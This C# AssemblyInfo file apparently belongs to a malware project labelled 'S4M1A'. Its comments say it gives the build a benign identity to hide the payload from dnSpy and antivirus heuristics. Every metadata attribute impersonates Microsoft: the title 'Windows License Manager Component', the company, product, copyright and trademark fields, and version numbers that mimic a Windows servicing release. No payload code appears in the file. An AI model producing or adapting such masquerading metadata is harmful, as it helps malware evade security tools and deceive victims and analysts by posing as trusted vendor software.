using System.Reflection;
using System.Runtime.InteropServices;

// S4M1A AssemblyInfo v2.0
// Benign build identity to obscure the payload from raw-file and
// metadata inspection (dnSpy, AV heuristics, etc).

[assembly: AssemblyTitle("Microsoft Corporation - Windows License Manager Component")]
[assembly: AssemblyDescription("Windows Licensing and Activation Services")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Microsoft Corporation")]
[assembly: AssemblyProduct("Microsoft\u00AE Windows\u00AE Operating System")]
[assembly: AssemblyCopyright("\u00A9 Microsoft Corporation. All rights reserved.")]
[assembly: AssemblyTrademark("Microsoft\u00AE and Windows\u00AE are trademarks of Microsoft Corporation")]
[assembly: AssemblyCulture("")]

// Version mimics a recent Windows servicing release
[assembly: AssemblyVersion("10.0.19041.1230")]
[assembly: AssemblyFileVersion("10.0.19041.1230")]
[assembly: AssemblyInformationalVersion("10.0.19041.1230")]

// No COM exposure
[assembly: ComVisible(false)]

// Fixed (not random) so repeated builds stay consistent
[assembly: Guid("2f3d9c1a-5e6b-4a7c-8d9e-f0a1b2c3d4e5")]

[assembly: NeutralResourcesLanguage("en-US")]